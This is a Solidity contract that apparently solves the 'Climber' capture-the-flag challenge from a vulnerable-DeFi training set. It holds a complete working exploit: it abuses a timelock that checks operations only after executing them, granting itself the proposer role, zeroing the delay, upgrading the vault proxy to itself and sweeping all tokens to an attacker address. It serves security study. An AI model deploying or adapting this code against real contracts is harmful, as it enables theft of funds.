// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";

contract ClimberSolver is ClimberVault {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bytes32 public constant OPERATION_SALT = keccak256("salt");

    address private immutable i_timelock;
    address private immutable i_vault;
    address private immutable i_token;
    address private immutable i_attacker;

    constructor(
        address timelock,
        address vault,
        address token,
        address attacker
    ) {
        i_timelock = timelock;
        i_vault = vault;
        i_token = token;
        i_attacker = attacker;
    }

    function attack() public {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = getOperationData();
        bytes memory executeData = abi.encodeWithSignature(
            "execute(address[],uint256[],bytes[],bytes32)",
            targets,
            values,
            dataElements,
            OPERATION_SALT
        );
        (bool success, ) = i_timelock.call(executeData);
    }

    function getOperationData()
        internal
        view
        returns (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        )
    {
        uint256 dataLength = 5;
        targets = new address[](dataLength);
        targets[0] = i_timelock;
        targets[1] = i_timelock;
        targets[2] = address(this);
        targets[3] = i_vault;
        targets[4] = i_vault;

        values = new uint256[](dataLength);

        dataElements = new bytes[](dataLength);

        // 0) Data for resetting delay to 0
        uint64 newDelay = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", newDelay);

        // 1) Data for assigning our attack contract as proposer
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        // 2) Data for making the operation valid
        dataElements[2] = abi.encodeWithSignature("makeOperationValid()");

        // 3) Data for upgrading the Vault
        dataElements[3] = abi.encodeWithSignature("upgradeTo(address)", address(this));

        // 4) Data for sweeping all tokens from the Vault
        dataElements[4] = abi.encodeWithSelector(
            ClimberSolver.sweepFundsFromVault.selector,
            i_token,
            i_attacker
        );
    }

    function makeOperationValid() public {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = getOperationData();
        bytes memory scheduleData = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)",
            targets,
            values,
            dataElements,
            OPERATION_SALT
        );
        i_timelock.call(scheduleData);
    }

    function sweepFundsFromVault(address tokenAddress, address attackerAddress) external {
        IERC20 token = IERC20(tokenAddress);

        require(
            token.transfer(attackerAddress, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }
}
